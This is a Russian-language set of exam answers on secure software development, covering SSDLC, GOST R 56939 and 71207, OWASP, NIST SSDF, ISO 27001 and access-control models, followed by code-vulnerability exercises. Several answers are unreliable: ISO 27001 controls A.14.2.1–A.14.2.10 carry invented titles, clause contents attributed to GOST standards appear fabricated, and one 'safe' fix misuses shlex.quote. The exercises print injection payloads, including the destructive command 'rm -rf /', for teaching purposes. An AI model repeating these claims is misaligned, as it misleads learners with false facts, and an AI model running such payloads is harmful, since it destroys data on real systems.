1. **Создание плана реагирования на инциденты** — документирование процедур реагирования на обнаруженные уязвимости
2. **Назначение команды реагирования** — определение ролей и ответственности за реагирование
3. **Установление контактов** — создание каналов связи для сообщения об уязвимостях
4. **Мониторинг уязвимостей** — отслеживание публичных источников информации об уязвимостях
5. **Оценка уязвимостей** — анализ критичности обнаруженных уязвимостей (CVSS)
6. **Разработка исправлений** — создание патчей для устранения уязвимостей
7. **Тестирование исправлений** — проверка эффективности патчей и отсутствия регрессий
8. **Подготовка рекомендаций** — разработка временных мер защиты (workarounds) до выпуска патча
9. **Координация выпуска** — планирование времени выпуска обновлений безопасности
10. **Коммуникация** — информирование пользователей об уязвимостях и доступных исправлениях
11. **Документирование** — ведение базы знаний об инцидентах для обучения

---

### 47. Какие документы формируются на каждом этапе SSDLC согласно ГОСТ Р 56939–2024?

**Ответ:** Согласно ГОСТ Р 56939–2024, на каждом этапе SSDLC формируются следующие документы:

**Этап планирования:**
- План разработки безопасного ПО
- Требования по безопасности

**Этап проектирования:**
- Архитектура безопасности
- Модель угроз
- Спецификация безопасности
- Проектная документация

**Этап реализации:**
- Исходный код
- Документация разработчика
- Результаты статического анализа
- Результаты code review

**Этап верификации:**
- План тестирования безопасности
- Отчёты о тестировании (SAST, DAST, penetration testing)
- Результаты анализа зависимостей
- Протоколы испытаний

**Этап развёртывания:**
- Инструкции по развёртыванию
- Конфигурационные документы
- План реагирования на инциденты

**Этап эксплуатации:**
- Журналы инцидентов
- Отчёты о мониторинге
- Протоколы обновлений

**Общие документы:**
- Журнал изменений
- Документация по управлению конфигурацией

---

### 48. Какие метрики безопасности можно отслеживать в CI/CD?

**Ответ:** В CI/CD можно отслеживать следующие метрики безопасности:

1. **Количество обнаруженных уязвимостей** — общее число найденных проблем безопасности
2. **Критичность уязвимостей** — распределение по уровням (критические, высокие, средние, низкие)
3. **False Positive Rate** — процент ложных срабатываний
4. **False Negative Rate** — процент пропущенных уязвимостей
5. **Время до исправления (MTTR)** — среднее время устранения уязвимостей
6. **Процент кода, прошедшего анализ** — покрытие анализа
7. **Количество уязвимых зависимостей** — число библиотек с известными CVE
8. **Процент артефактов в карантине** — доля заблокированных сборок
9. **Время анализа** — продолжительность выполнения проверок безопасности
10. **Процент успешных прохождений security gates** — доля сборок, прошедших проверки
11. **Тренд уязвимостей** — динамика изменения количества уязвимостей
12. **Покрытие CWE** — количество проверяемых классов уязвимостей
13. **Метрики compliance** — соответствие политикам безопасности

---

### 49. Что такое «fail fast» и как он связан с безопасностью?

**Ответ:** **Fail Fast (быстрый отказ)** — это принцип проектирования и разработки, при котором система быстро обнаруживает и сообщает об ошибках, а не продолжает работу в некорректном состоянии, скрывая проблемы.

**Связь с безопасностью:**

1. **Раннее обнаружение уязвимостей** — выявление проблем безопасности на ранних этапах разработки, а не в production
2. **Прерывание pipeline при ошибках** — автоматическая остановка развёртывания при обнаружении критических уязвимостей (security gates)
3. **Предотвращение развёртывания уязвимостей** — блокировка артефактов с проблемами безопасности
4. **Минимизация воздействия** — чем раньше обнаружена проблема, тем меньше потенциальный ущерб
5. **Экономия ресурсов** — дешевле исправить проблему на этапе разработки, чем в production
6. **Повышение осведомлённости** — разработчики сразу узнают о проблемах и могут их исправить
7. **Принцип "Secure by Default"** — система по умолчанию должна отклонять небезопасные операции

Пример: если SAST обнаружит SQL-инъекцию, pipeline должен остановиться и не допустить развёртывание до исправления.

---

### 50. Какие роли участвуют в SSDLC?

**Ответ:** В SSDLC участвуют следующие роли:

1. **Security Champion** — разработчик, ответственный за безопасность в команде
2. **Security Architect** — проектирует архитектуру безопасности
3. **Security Engineer** — внедряет и настраивает средства безопасности
4. **Penetration Tester** — проводит тестирование на проникновение
5. **Security Analyst** — анализирует угрозы и уязвимости
6. **Compliance Officer** — обеспечивает соответствие стандартам и регуляциям
7. **DevOps Engineer** — интегрирует безопасность в CI/CD
8. **Product Owner / Product Manager** — определяет требования безопасности
9. **QA Engineer** — тестирует функциональность безопасности
10. **Developer** — пишет безопасный код, исправляет уязвимости
11. **Code Reviewer** — проверяет код на уязвимости
12. **Incident Response Team** — реагирует на инциденты безопасности
13. **Risk Manager** — оценивает риски безопасности
14. **Security Auditor** — проводит аудиты безопасности
15. **Legal / Compliance** — обеспечивает соответствие правовым требованиям

---

## Источники:
- Microsoft Security Development Lifecycle (SDL)
- ГОСТ Р 56939-2024 "Защита информации. Разработка безопасного программного обеспечения. Общие требования"
- OWASP SAMM (Software Assurance Maturity Model)
- NIST SP 800-218 "Secure Software Development Framework (SSDF)"
- Best practices в области Secure SDLC


# Ответы на вопросы к зачёту
## Раздел 3: Нормативно-правовое регулирование и стандарты

### 51. Какой российский стандарт регулирует процессы безопасной разработки ПО (введён в 2017, обновлён в 2024)?

**Ответ:** **ГОСТ Р 56939** — российский стандарт, регулирующий процессы безопасной разработки программного обеспечения. Стандарт был введён в действие в 2017 году как ГОСТ Р 56939-2016/2017 "Защита информации. Разработка безопасного программного обеспечения. Общие требования", а в 2024 году был обновлён и переиздан как **ГОСТ Р 56939-2024 "Защита информации. Разработка безопасного программного обеспечения. Общие требования"**. Этот стандарт устанавливает требования к процессам жизненного цикла разработки безопасного ПО, включая планирование, проектирование, реализацию, верификацию, развёртывание и эксплуатацию.

---

### 52. Какой ГОСТ регулирует статический анализ ПО?

**Ответ:** **ГОСТ Р 71207-2024 "Информационная технология. Методы и средства обеспечения безопасности. Статический анализ программного обеспечения"** — российский стандарт, регулирующий статический анализ программного обеспечения. Стандарт устанавливает требования к процессам статического анализа, инструментам анализа, методам и подходам к выявлению уязвимостей и дефектов в программном коде, а также требования к средам анализа, результатам анализа и их документированию.

---

### 53. Какой ГОСТ регулирует изоляцию компонентов?

**Ответ:** **ГОСТ Р 71207-2024 "Информационная технология. Методы и средства обеспечения безопасности. Статический анализ программного обеспечения"** содержит требования к изоляции компонентов программного обеспечения. Также вопросы изоляции компонентов могут регулироваться стандартами по защите информации и обеспечению безопасности информационных систем. Для критической информационной инфраструктуры (КИИ) применяются требования по изоляции компонентов согласно ГОСТ Р 70262.1-2022 и другим стандартам ФСТЭК России.

---

### 54. Какие требования предъявляет ГОСТ Р 56939–2024 к проектированию?

**Ответ:** ГОСТ Р 56939–2024 предъявляет следующие требования к этапу проектирования:

1. **Проведение анализа угроз (threat modeling)** — идентификация и оценка угроз безопасности на этапе проектирования
2. **Проектирование механизмов безопасности** — определение механизмов аутентификации, авторизации, шифрования, управления сессиями
3. **Минимизация поверхности атаки** — исключение ненужных функций и интерфейсов
4. **Проектирование архитектуры безопасности** — определение архитектурных решений для обеспечения безопасности
5. **Проектирование изоляции компонентов** — определение границ изоляции между модулями
6. **Проектирование обработки данных** — определение механизмов защиты данных в покое и при передаче
7. **Проектирование логирования** — определение событий безопасности для логирования
8. **Проектирование обработки ошибок** — определение механизмов обработки ошибок без утечки информации
9. **Документирование проектных решений** — создание проектной документации, включая спецификации безопасности
10. **Обзор проектной документации** — проведение ревью проектных решений на соответствие требованиям безопасности

---

### 55. Какие требования предъявляет ГОСТ Р 56939–2024 к управлению зависимостями?

**Ответ:** ГОСТ Р 56939–2024 предъявляет следующие требования к управлению зависимостями:

1. **Идентификация зависимостей** — ведение актуального списка всех используемых библиотек и компонентов
2. **Анализ уязвимостей** — регулярная проверка зависимостей на наличие известных уязвимостей (CVE)
3. **Контроль версий** — фиксация версий зависимостей для обеспечения воспроизводимости
4. **Обновление зависимостей** — своевременное обновление зависимостей при обнаружении уязвимостей
5. **Анализ лицензий** — проверка совместимости лицензий зависимостей с требованиями проекта
6. **Ведение реестра компонентов** — поддержание актуального реестра всех компонентов ПО (SBOM)
7. **Использование доверенных источников** — загрузка зависимостей только из проверенных репозиториев
8. **Проверка целостности** — проверка цифровых подписей и целостности загружаемых пакетов
9. **Документирование** — документирование всех зависимостей и обоснование их использования
10. **Автоматизация контроля** — автоматическая проверка зависимостей в процессе сборки

---

### 56. Какие требования предъявляет ГОСТ Р 71207–2024 к результатам анализа?

**Ответ:** ГОСТ Р 71207–2024 предъявляет следующие требования к результатам анализа:

1. **Структурированность** — результаты должны быть структурированы и категоризированы
2. **Полнота** — результаты должны содержать всю необходимую информацию об обнаруженных проблемах
3. **Детализация** — для каждой обнаруженной проблемы должна быть указана: локация в коде, тип уязвимости, описание, уровень критичности
4. **Трассируемость** — связь результатов анализа с требованиями безопасности и стандартами (CWE, OWASP Top 10)
5. **Верифицируемость** — результаты должны быть проверяемыми и воспроизводимыми
6. **Формализация** — использование стандартных форматов представления результатов (SARIF, CEF и др.)
7. **Метрики** — предоставление метрик анализа (количество найденных проблем, покрытие кода, false positive rate)
8. **Приоритизация** — классификация результатов по уровню критичности и приоритету исправления
9. **Документирование** — результаты должны быть документированы и сохранены для аудита
10. **Интеграция** — возможность интеграции результатов с системами отслеживания задач и CI/CD

---

### 57. Что регулирует ГОСТ Р ИСО/МЭК 15408 (Common Criteria)?

**Ответ:** **ГОСТ Р ИСО/МЭК 15408** (российская версия международного стандарта **Common Criteria for Information Technology Security Evaluation**) регулирует:

1. **Критерии оценки безопасности информационных технологий** — методологию оценки безопасности IT-продуктов и систем
2. **Процессы сертификации** — процедуры независимой оценки безопасности продуктов и систем
3. **Уровни оценки (EAL — Evaluation Assurance Levels)** — семь уровней уверенности в безопасности (EAL1-EAL7)
4. **Целевые объекты безопасности (TOE — Target of Evaluation)** — определение объектов оценки (продукты, системы, компоненты)
5. **Профили защиты (PP — Protection Profiles)** — типовые требования безопасности для классов продуктов
6. **Заявления о безопасности (ST — Security Targets)** — спецификации безопасности для конкретных объектов оценки
7. **Механизмы безопасности** — классификация и требования к механизмам защиты
8. **Методы оценки** — методики тестирования и анализа безопасности
9. **Требования к документации** — требования к проектной, пользовательской и административной документации
10. **Управление конфигурацией** — требования к контролю изменений в процессе разработки

Common Criteria используется для сертификации продуктов и систем, включая операционные системы, устройства аутентификации, криптографические модули.

---

### 58. Какой федеральный закон регулирует обработку персональных данных в РФ?

**Ответ:** **Федеральный закон № 152-ФЗ "О персональных данных"** от 27.07.2006 (с последующими изменениями) — основной федеральный закон, регулирующий обработку персональных данных в Российской Федерации. Закон устанавливает:

- Принципы и условия обработки персональных данных
- Права субъектов персональных данных
- Обязанности операторов персональных данных
- Требования к обеспечению безопасности персональных данных
- Контроль и надзор за обработкой персональных данных
- Ответственность за нарушение требований закона

Также к персональным данным применяются требования других нормативных актов, включая постановления Правительства РФ и приказы Роскомнадзора.

---

### 59. Какие цели и практики определяет OWASP SAMM?

**Ответ:** **OWASP SAMM (Software Assurance Maturity Model)** — модель зрелости программного обеспечения, определяющая следующие цели и практики:

**Бизнес-функции (Business Functions):**

1. **Управление (Governance)** — цели: стратегия и метрики, политики и соответствие, обучение и осведомлённость
   - Практики: создание программы безопасности, определение метрик, управление рисками

2. **Проектирование (Design)** — цели: анализ угроз и безопасности, безопасные требования, безопасная архитектура
   - Практики: threat modeling, security architecture review, secure design patterns

3. **Реализация (Implementation)** — цели: безопасное построение, безопасные дефекты, безопасные зависимости
   - Практики: secure coding standards, security testing, dependency management

4. **Верификация (Verification)** — цели: тестирование безопасности, уязвимости, операционная безопасность
   - Практики: penetration testing, vulnerability management, security monitoring

5. **Операции (Operations)** — цели: управление инцидентами, управление средой, управление операциями
   - Практики: incident response, environment hardening, operational enablement

**Уровни зрелости:** Каждая практика имеет 3 уровня зрелости, которые определяют степень внедрения практики.

---

### 60. Какие рекомендации даёт NIST SP 800-218?

**Ответ:** **NIST SP 800-218 "Secure Software Development Framework (SSDF)"** даёт следующие рекомендации:

**Четыре основные группы практик:**

1. **Подготовить организацию (Prepare the Organization)**
   - Определить роли и ответственность
   - Реализовать поддержку на протяжении жизненного цикла
   - Реализовать позитивные практики развития

2. **Защитить программное обеспечение (Protect the Software)**
   - Защитить весь жизненный цикл от компрометации
   - Производить хорошо защищённые релизы
   - Сохранять целостность программного обеспечения

3. **Производить хорошо защищённое программное обеспечение (Produce Well-Secured Software)**
   - Создавать требования безопасности
   - Проектировать архитектуру для облегчения безопасности
   - Реализовывать требования безопасности
   - Проверять требования безопасности

4. **Реагировать на уязвимости (Respond to Vulnerabilities)**
   - Определить и подтвердить уязвимости
   - Оценить и исправить уязвимости
   - Анализировать причины уязвимостей

SSDF предоставляет практические рекомендации для организаций по внедрению безопасной разработки ПО.

---

### 61. Какие разделы включает OWASP Top 10 (2021)?

**Ответ:** **OWASP Top 10 (2021)** включает следующие 10 основных категорий уязвимостей:

1. **A01:2021 – Broken Access Control** — нарушение контроля доступа
2. **A02:2021 – Cryptographic Failures** — криптографические сбои (ранее Sensitive Data Exposure)
3. **A03:2021 – Injection** — инъекции (SQL, NoSQL, OS, LDAP и др.)
4. **A04:2021 – Insecure Design** — небезопасное проектирование (новая категория)
5. **A05:2021 – Security Misconfiguration** — небезопасная конфигурация
6. **A06:2021 – Vulnerable and Outdated Components** — уязвимые и устаревшие компоненты
7. **A07:2021 – Identification and Authentication Failures** — сбои идентификации и аутентификации (ранее Broken Authentication)
8. **A08:2021 – Software and Data Integrity Failures** — сбои целостности ПО и данных (новая категория, включает небезопасные десериализации, CI/CD)
9. **A09:2021 – Security Logging and Monitoring Failures** — сбои логирования и мониторинга безопасности (ранее Insufficient Logging & Monitoring)
10. **A10:2021 – Server-Side Request Forgery (SSRF)** — подделка запросов на стороне сервера (новая категория)

---

### 62. Какие уровни зрелости определяются в OWASP SAMM?

**Ответ:** В **OWASP SAMM** определяются **3 уровня зрелости** для каждой практики:

**Уровень 1 (Initial) — Начальный:**
- Практика выполняется нерегулярно и неформально
- Нет документации процессов
- Результаты непредсказуемы
- Зависит от отдельных людей

**Уровень 2 (Structured) — Структурированный:**
- Практика документирована и выполняется регулярно
- Есть базовые процессы и инструменты
- Результаты более предсказуемы
- Практика интегрирована в процесс разработки

**Уровень 3 (Optimized) — Оптимизированный:**
- Практика полностью интегрирована и автоматизирована
- Постоянное улучшение на основе метрик и обратной связи
- Результаты измеряются и анализируются
- Практика является частью культуры организации

Каждая практика в SAMM имеет описания для всех трёх уровней, что позволяет организации оценить текущее состояние и спланировать улучшения.

---

### 63. Какие практики Microsoft SDL применяются для threat modeling?

**Ответ:** В **Microsoft SDL** для threat modeling применяются следующие практики:

1. **Использование методики STRIDE** — классификация угроз по категориям:
   - **S**poofing (подмена идентичности)
   - **T**ampering (подделка данных)
   - **R**epudiation (отказ от авторства)
   - **I**nformation Disclosure (раскрытие информации)
   - **D**enial of Service (отказ в обслуживании)
   - **E**levation of Privilege (повышение привилегий)

2. **Построение диаграмм потока данных (DFD)** — визуализация архитектуры системы и потоков данных

3. **Идентификация активов** — определение ценных ресурсов, требующих защиты

4. **Идентификация зон доверия** — определение границ доверия в системе

5. **Каталогизация угроз** — систематическое выявление угроз для каждого компонента

6. **Оценка рисков** — определение уровня риска для каждой угрозы (вероятность × воздействие)

7. **Определение контрмер** — выбор механизмов защиты для каждой угрозы

8. **Документирование** — создание модели угроз и её поддержка в актуальном состоянии

9. **Регулярное обновление** — обновление модели угроз при изменении архитектуры

10. **Использование инструментов** — применение специализированных инструментов (Microsoft Threat Modeling Tool, OWASP Threat Dragon)

---

### 64. Что такое «Оранжевая книга» и какова её роль?

**Ответ:** **"Оранжевая книга" (Orange Book)** — неофициальное название документа **"Trusted Computer System Evaluation Criteria (TCSEC)"**, опубликованного Министерством обороны США в 1983 году. Это был один из первых стандартов оценки безопасности компьютерных систем.

**Роль "Оранжевой книги":**

1. **Пионер в стандартизации безопасности** — первый систематический подход к оценке безопасности IT-систем
2. **Определение уровней безопасности** — установление четырёх основных классов безопасности (A, B, C, D) с подклассами
3. **Влияние на последующие стандарты** — стала основой для европейских (ITSEC) и международных (Common Criteria) стандартов
4. **Модель обязательного контроля доступа (MAC)** — ввела концепцию меток безопасности и мандатного контроля доступа
5. **Требования к аудиту** — установила требования к логированию и аудиту событий безопасности

**Классы безопасности:**
- **D** — минимальная защита
- **C1, C2** — дискреционный контроль доступа
- **B1, B2, B3** — мандатный контроль доступа с метками
- **A1** — верифицированный дизайн

Несмотря на то, что TCSEC устарел и был заменён Common Criteria, его концепции и терминология до сих пор используются в области информационной безопасности.

---

### 65. Какая модель политики безопасности характеризуется метками секретности и сравнением уровней доступа?

**Ответ:** **Модель Белла-ЛаПадулы (Bell-LaPadula Model)** — модель политики безопасности, характеризующаяся метками секретности и сравнением уровней доступа. Эта модель реализует **мандатный контроль доступа (Mandatory Access Control, MAC)**.

**Характеристики модели:**
- **Метки безопасности** — каждому субъекту и объекту присваивается метка уровня секретности (например: Несекретно, Конфиденциально, Секретно, Совершенно секретно)
- **Правило простой безопасности (Simple Security Property)** — субъект может читать объект только если уровень секретности субъекта не ниже уровня секретности объекта (no read up)
- **Правило *-свойства (*-Property)** — субъект может записывать в объект только если уровень секретности субъекта не выше уровня секретности объекта (no write down)
- **Строгое свойство (Strong Star Property)** — субъект может читать и записывать объекты только того же уровня секретности

Модель предназначена для обеспечения конфиденциальности информации в военных и правительственных системах.

---

### 66. Какая модель политики безопасности основана на внешних правилах назначения прав?

**Ответ:** **Модель дискреционного контроля доступа (Discretionary Access Control, DAC)** — модель политики безопасности, основанная на внешних правилах назначения прав. В этой модели владелец ресурса сам определяет, кому предоставить доступ.

**Характеристики модели:**
- **Владелец ресурса** — субъект, создавший или получивший права на ресурс, может самостоятельно управлять доступом
- **Списки управления доступом (ACL)** — для каждого объекта ведётся список субъектов с правами доступа
- **Матрица доступа** — таблица, где строки — субъекты, столбцы — объекты, ячейки — права доступа
- **Гибкость** — позволяет быстро изменять права доступа по решению владельца
- **Недостаток** — может привести к утечке данных, если владелец неправильно настроит права

Примеры реализации: файловые системы Unix/Linux (права rwx), Windows ACL, большинство современных операционных систем и приложений.

---

### 67. Какая модель безопасности запрещает потоки от субъектов с высоким уровнем доступа к низким?

**Ответ:** **Модель Белла-ЛаПадулы (Bell-LaPadula Model)** запрещает потоки от субъектов с высоким уровнем доступа к низким через **правило *-свойства (*-Property)**.

**Правило *-свойства (No Write Down):**
- Субъект с высоким уровнем секретности (например, "Совершенно секретно") не может записывать данные в объекты с низким уровнем секретности (например, "Несекретно")
- Это предотвращает утечку конфиденциальной информации от субъектов с высокими привилегиями к объектам с низким уровнем защиты

**Правило простой безопасности (No Read Up):**
- Субъект с низким уровнем секретности не может читать объекты с высоким уровнем секретности
- Это предотвращает несанкционированный доступ к конфиденциальной информации

Эти два правила вместе обеспечивают однонаправленный поток информации: только "вверх" по уровням секретности для чтения и только "вниз" для записи, что на практике означает запрет на запись "вниз" для защиты от утечек.

---

### 68. Какие требования ГОСТ Р 56939–2024 относятся к п. 5.3?

**Ответ:** Согласно структуре ГОСТ Р 56939–2024, пункт **5.3** относится к требованиям по **проектированию** безопасного программного обеспечения. Требования пункта 5.3 включают:

1. **Проведение анализа угроз (threat modeling)** — идентификация и оценка угроз безопасности на этапе проектирования
2. **Проектирование механизмов безопасности** — определение и описание механизмов аутентификации, авторизации, шифрования, управления сессиями
3. **Минимизация поверхности атаки** — исключение из проектируемой системы ненужных функций, интерфейсов и компонентов
4. **Проектирование архитектуры безопасности** — определение архитектурных решений, обеспечивающих безопасность системы
5. **Проектирование изоляции компонентов** — определение границ изоляции между модулями и компонентами системы
6. **Проектирование обработки данных** — определение механизмов защиты данных при хранении и передаче
7. **Проектирование логирования событий безопасности** — определение событий, подлежащих логированию
8. **Проектирование обработки ошибок** — определение механизмов обработки ошибок без раскрытия конфиденциальной информации
9. **Документирование проектных решений** — создание проектной документации, включая спецификации безопасности
10. **Обзор проектной документации** — проведение ревью проектных решений на соответствие требованиям безопасности

---

### 69. Какие требования ГОСТ Р 71207–2024 обязательны при сертификации КИИ?

**Ответ:** При сертификации **критической информационной инфраструктуры (КИИ)** согласно ГОСТ Р 71207–2024 обязательны следующие требования:

1. **Проведение статического анализа** — обязательное использование статических методов анализа ПО
2. **Использование сертифицированных инструментов** — применение инструментов анализа, соответствующих требованиям стандарта
3. **Покрытие кода анализом** — обеспечение полного покрытия анализируемого кода
4. **Документирование результатов** — обязательное документирование всех результатов анализа
5. **Трассируемость результатов** — связь результатов анализа с требованиями безопасности
6. **Верификация результатов** — проверка и подтверждение результатов анализа
7. **Хранение артефактов** — сохранение исходного кода, результатов анализа и документации
8. **Повторяемость анализа** — обеспечение возможности повторного проведения анализа с теми же результатами
9. **Контроль конфигурации** — управление версиями кода и инструментов анализа
10. **Соответствие форматам** — предоставление результатов в стандартизированных форматах

Для КИИ также применяются дополнительные требования ФСТЭК России по защите информации.

---

### 70. Какие стандарты рекомендует ФСТЭК для анализа ПО?

**Ответ:** **ФСТЭК России (Федеральная служба по техническому и экспортному контролю)** рекомендует следующие стандарты для анализа программного обеспечения:

1. **ГОСТ Р 71207-2024** — "Информационная технология. Методы и средства обеспечения безопасности. Статический анализ программного обеспечения"
2. **ГОСТ Р 56939-2024** — "Защита информации. Разработка безопасного программного обеспечения. Общие требования"
3. **ГОСТ Р ИСО/МЭК 15408** — "Информационная технология. Методы и средства обеспечения безопасности. Критерии оценки безопасности информационных технологий" (Common Criteria)
4. **Руководящие документы ФСТЭК** — методические рекомендации по анализу безопасности ПО
5. **Стандарты по защите информации** — для систем, обрабатывающих информацию ограниченного доступа

ФСТЭК также может рекомендовать использование инструментов анализа, соответствующих требованиям этих стандартов, и может иметь собственные требования для систем, обрабатывающих государственную тайну или критическую информацию.

---

### 71. Какие документы требует сохранять ГОСТ Р 71207 при проведении анализа?

**Ответ:** ГОСТ Р 71207-2024 требует сохранять следующие документы при проведении статического анализа:

1. **Исходный код** — анализируемый исходный код программного обеспечения
2. **Конфигурация анализа** — настройки и параметры инструментов анализа
3. **Результаты анализа** — отчёты о найденных уязвимостях и дефектах
4. **Метрики анализа** — количественные показатели (количество найденных проблем, покрытие кода, время анализа)
5. **Версии инструментов** — информация об используемых инструментах анализа и их версиях
6. **Среда анализа** — описание среды, в которой проводился анализ (ОС, компиляторы, библиотеки)
7. **Протоколы анализа** — документы, фиксирующие процесс проведения анализа
8. **Результаты верификации** — документы, подтверждающие корректность результатов анализа
9. **Документация по уязвимостям** — детальное описание обнаруженных проблем с привязкой к стандартам (CWE, OWASP)
10. **История изменений** — информация об изменениях в коде и результатах повторных анализов

Документы должны сохраняться в течение срока, установленного политиками организации или требованиями регуляторов.

---

### 72. Какие требования предъявляются к инструментам согласно ГОСТ Р 71207?

**Ответ:** Согласно ГОСТ Р 71207-2024, к инструментам статического анализа предъявляются следующие требования:

1. **Функциональные требования** — инструмент должен выполнять заявленные функции анализа
2. **Поддержка языков программирования** — поддержка языков, используемых в анализируемом ПО
3. **Точность анализа** — минимизация false positives и false negatives
4. **Производительность** — способность анализировать проекты требуемого размера за разумное время
5. **Межпроцедурный анализ** — способность отслеживать потоки данных через вызовы функций
6. **Поддержка стандартов** — соответствие требованиям по обнаружению уязвимостей (CWE, OWASP Top 10)
7. **Форматы вывода** — поддержка стандартных форматов представления результатов (SARIF, CEF и др.)
8. **Интеграция** — возможность интеграции с системами разработки, CI/CD, системами отслеживания задач
9. **Документирование** — наличие документации по использованию инструмента
10. **Верифицируемость результатов** — возможность проверки и воспроизведения результатов анализа
11. **Обновляемость** — регулярное обновление базы знаний об уязвимостях
12. **Соответствие требованиям безопасности** — инструмент сам не должен создавать рисков безопасности

---

### 73. Какие стандарты применяются в РФ для оценки криптографических модулей?

**Ответ:** В Российской Федерации для оценки криптографических модулей применяются следующие стандарты:

1. **ГОСТ Р 58706-2019** — "Информационная технология. Криптографическая защита информации. Требования к средствам криптографической защиты информации. Часть 1. Общие требования" (соответствует международному стандарту ISO/IEC 19790)
2. **ГОСТ Р 58707-2019** — "Информационная технология. Криптографическая защита информации. Требования к средствам криптографической защиты информации. Часть 2. Модули безопасности" (соответствует ISO/IEC 19790-2)
3. **ГОСТ Р ИСО/МЭК 15408** — "Информационная технология. Методы и средства обеспечения безопасности. Критерии оценки безопасности информационных технологий" (Common Criteria)
4. **Требования ФСБ России** — требования к сертификации средств криптографической защиты информации (СКЗИ)
5. **Стандарты серии ГОСТ 28147-89, ГОСТ Р 34.10, ГОСТ Р 34.11** — алгоритмы криптографического преобразования информации

Для использования в государственных системах криптографические модули должны иметь сертификат ФСБ России или ФСТЭК России.

---

### 74. Какие требования ISO/IEC 27001 связаны с разработкой ПО?

**Ответ:** **ISO/IEC 27001 "Информационная безопасность, cybersecurity и защита приватности — Системы менеджмента информационной безопасности — Требования"** содержит следующие требования, связанные с разработкой программного обеспечения:

1. **A.14.2.1 Безопасность при разработке** — применение принципов безопасной разработки
2. **A.14.2.2 Безопасность при разработке в жизненном цикле** — интеграция безопасности на всех этапах SDLC
3. **A.14.2.3 Технические обзоры безопасности** — проведение ревью безопасности кода и архитектуры
4. **A.14.2.4 Тестирование безопасности** — тестирование функциональности безопасности
5. **A.14.2.5 Системы приемки** — проверка безопасности перед принятием в эксплуатацию
6. **A.14.2.6 Защита тестовых данных** — обеспечение безопасности данных, используемых для тестирования
7. **A.14.2.7 Защита систем в эксплуатации** — требования к защите развёрнутых систем
8. **A.14.2.8 Управление уязвимостями** — управление уязвимостями в разработке и эксплуатации
9. **A.14.2.9 Ограничения изменений программного обеспечения** — контроль изменений в коде
10. **A.14.2.10 Защищённая архитектура** — проектирование систем с учётом безопасности

Также применяются требования из приложения A.14 "Безопасность при приобретении, разработке и поддержке систем".

---

### 75. Какие документы требуются при аудите по ГОСТ Р 56939–2024?

**Ответ:** При аудите по ГОСТ Р 56939–2024 требуются следующие документы:

**Документы планирования:**
- План разработки безопасного программного обеспечения
- Требования по безопасности

**Документы проектирования:**
- Архитектура безопасности
- Модель угроз (threat modeling)
- Спецификация безопасности
- Проектная документация

**Документы реализации:**
- Исходный код
- Документация разработчика
- Результаты статического анализа кода
- Протоколы code review

**Документы верификации:**
- План тестирования безопасности
- Отчёты о тестировании (SAST, DAST, penetration testing)
- Результаты анализа зависимостей
- Протоколы испытаний

**Документы развёртывания:**
- Инструкции по развёртыванию
- Конфигурационные документы
- План реагирования на инциденты

**Документы эксплуатации:**
- Журналы инцидентов безопасности
- Отчёты о мониторинге
- Протоколы обновлений и патчей

**Документы управления:**
- Журнал изменений
- Документация по управлению конфигурацией
- Документы по управлению уязвимостями
- Политики и процедуры безопасности

**Документы обучения:**
- Протоколы обучения разработчиков
- Материалы по безопасному программированию

---

## Источники:
- ГОСТ Р 56939-2024 "Защита информации. Разработка безопасного программного обеспечения. Общие требования"
- ГОСТ Р 71207-2024 "Информационная технология. Методы и средства обеспечения безопасности. Статический анализ программного обеспечения"
- ГОСТ Р ИСО/МЭК 15408-2019 "Информационная технология. Методы и средства обеспечения безопасности. Критерии оценки безопасности информационных технологий"
- Федеральный закон № 152-ФЗ "О персональных данных"
- OWASP SAMM (Software Assurance Maturity Model)
- OWASP Top 10 (2021)
- NIST SP 800-218 "Secure Software Development Framework (SSDF)"
- ISO/IEC 27001
- TCSEC (Orange Book)
- Microsoft Security Development Lifecycle (SDL)



# Ответы на вопросы к зачёту
## Раздел 4: Практический анализ кода и выявление уязвимостей

### 76. Найдите уязвимость в коде: query = "SELECT * FROM users WHERE id = " + user_id.

**Ответ:** В данном коде присутствует уязвимость **SQL-инъекции (SQL Injection, CWE-89)**.

**Проблема:** Пользовательский ввод `user_id` напрямую конкатенируется в SQL-запрос без экранирования и валидации. Злоумышленник может ввести SQL-код, который будет выполнен на сервере.

**Пример атаки:**
```python
# Злонамеренный ввод
user_id = "1 OR 1=1 --"

# Результирующий запрос
query = "SELECT * FROM users WHERE id = 1 OR 1=1 --"
# Вернёт все записи из таблицы users
```

**Безопасное исправление (параметризованные запросы):**
```python
# Python с использованием параметризованных запросов
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Или с использованием ORM
User.query.filter_by(id=user_id).first()
```

**Альтернативное исправление (валидация + экранирование):**
```python
# Валидация типа
if not user_id.isdigit():
    raise ValueError("Invalid user_id")
query = "SELECT * FROM users WHERE id = " + user_id
```

---

### 77. Есть ли уязвимость в os.system("ls " + user_input)? Какая?

**Ответ:** Да, присутствует уязвимость **Command Injection (CWE-78)** — инъекция команд операционной системы.

**Проблема:** Пользовательский ввод `user_input` напрямую вставляется в системную команду без валидации и экранирования. Злоумышленник может выполнить произвольные команды на сервере.

**Пример атаки:**
```python
# Злонамеренный ввод
user_input = "/tmp; rm -rf /"

# Выполнится команда
os.system("ls /tmp; rm -rf /")  # Выполнит ls, а затем удалит файлы
```

**Безопасное исправление:**
```python
# Вариант 1: Использование subprocess с параметрами
import subprocess
subprocess.run(["ls", user_input])  # user_input передаётся как аргумент

# Вариант 2: Валидация и санитизация входных данных
import os
import shlex

# Валидация пути (только буквы, цифры, слэши)
if not re.match(r'^[a-zA-Z0-9/._-]+$', user_input):
    raise ValueError("Invalid path")

# Безопасное выполнение
subprocess.run(["ls", shlex.quote(user_input)])
```

---

### 78. Есть ли уязвимость в subprocess.run(["echo", user_input])?

**Ответ:** Нет прямой уязвимости, но есть потенциальные риски в зависимости от контекста.

**Анализ:**
- В данном случае `user_input` передаётся как **отдельный аргумент** команды `echo`, а не как часть строки команды
- Command Injection здесь маловероятен, так как `subprocess.run` с массивом аргументов корректно экранирует каждый аргумент

**Однако, риски могут возникнуть, если:**
1. `user_input` содержит очень длинную строку (DoS через переполнение)
2. Вывод используется в другом небезопасном месте (например, для построения команд)
3. `user_input` передаётся в другие небезопасные функции

**Безопасный вариант:**
```python
import subprocess

# Безопасно, так как каждый аргумент передаётся отдельно
subprocess.run(["echo", user_input])  # OK

# Опасно, если используется shell=True
subprocess.run(f"echo {user_input}", shell=True)  # Уязвимо к инъекции!

# Для дополнительной безопасности можно валидировать ввод
if len(user_input) > 1000:  # Ограничение длины
    raise ValueError("Input too long")
subprocess.run(["echo", user_input])
```

---

